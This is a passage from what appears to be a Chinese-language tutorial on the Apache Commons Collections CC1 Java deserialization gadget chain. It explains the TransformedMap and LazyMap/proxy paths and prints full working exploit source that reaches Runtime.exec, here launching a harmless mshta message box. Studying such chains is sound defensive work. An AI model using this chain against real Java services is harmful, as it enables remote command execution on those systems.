bjectOutputStream oos=new ObjectOutputStream(new FileOutputStream(&quot;ser.bin&quot;));        oos.writeObject(obj);    &#125;    public static Object unserialize(String filename) throws Exception &#123;        ObjectInputStream ois=new ObjectInputStream(new FileInputStream(filename));        Object obj=ois.readObject();        return obj;    &#125;&#125;
最终成功调用：成功弹窗！可以调试分析一下刚刚的判断：2个if判断都通过了，进入setvalue方法：调用AbstractInputCheckedMapDecorator的setValue方法，进而调用checksetValue：继续调用chainedtransformer的transform方法：之后就是进行一系列的递归，最终调用Runtime.getRuntime().exec，完美收工
1X2.1.3 对比Ysoserial的CC1Ysoserial的调用链与我们的高度相似，唯一不同的就是LazyMap.get()，我们使用的是TransformedMap.checkSetValue,但是这两个方法最终调用的都是transform方法：还有就是开头一段：可以看到调用了AnnotationInvocationHandler的invoke方法：是一个动态代理，我们把Annotationinvocationhandler用proxy包裹，再包裹进Map数组，就可以调用invoke方法，和一开始讲的动态代理是一个意思
import org.apache.commons.collections.Transformer;import org.apache.commons.collections.functors.ChainedTransformer;import org.apache.commons.collections.functors.ConstantTransformer;import org.apache.commons.collections.functors.InvokerTransformer;import org.apache.commons.collections.map.LazyMap;import org.apache.commons.collections.map.TransformedMap;import java.io.*;import java.lang.annotation.Target;import java.lang.reflect.Constructor;import java.lang.reflect.InvocationHandler;import java.lang.reflect.Method;import java.lang.reflect.Proxy;import java.util.HashMap;import java.util.Map;public class CC1test &#123;    public static void main(String[] args) throws Exception &#123;        Transformer[] transformers=new Transformer[]&#123;                new ConstantTransformer(Runtime.class),                new InvokerTransformer(&quot;getMethod&quot;,new Class[]&#123;String.class,Class[].class&#125;,new Object[]&#123;&quot;getRuntime&quot;,null&#125;),                new InvokerTransformer(&quot;invoke&quot;,new Class[]&#123;Object.class,Object[].class&#125;,new Object[]&#123;null,null&#125;),                new InvokerTransformer(&quot;exec&quot;,new Class[]&#123;String.class&#125;,new Object[]&#123;&quot; mshta vbscript:msgbox(\&quot;恭喜你成功完成CC1！\&quot;,64,\&quot;Congratulations！\&quot;)(window.close)&quot;&#125;)        &#125;;        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);        HashMap&lt;Object,Object&gt; map=new HashMap&lt;&gt;();        Map&lt;Object,Object&gt; lazymap = LazyMap.decorate(map,chainedTransformer);        Class c = Class.forName(&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;);        Constructor annotationconstructor = c.getDeclaredConstructor(Class.class, Map.class);        annotationconstructor.setAccessible(true);        InvocationHandler handler = (InvocationHandler) annotationconstructor.newInstance(Override.class, lazymap);        //生成动态代理        Map mapproxy= (Map) Proxy.newProxyInstance(LazyMap.class.getClassLoader(),new Class[]&#123;Map.class&#125;,handler);        //生成最外层        Object o = annotationconstructor.newInstance(Override.class, mapproxy);        serialize(o);        unserialize(&quot;ser.bin&quot;);    &#125;    public static void serialize(Object obj) throws Exception &#123;        ObjectOutputStream oos=new ObjectOutputStream(new FileOutputStream(&quot;ser.bin&quot;));        oos.writeObject(obj);    &#125;    public static Object unserialize(String filename) throws Exception &#123;        ObjectInputStream ois=new ObjectInputStream(new FileInputStream(filename));        Object obj=ois.readObject();        return obj;    &#125;&#125;
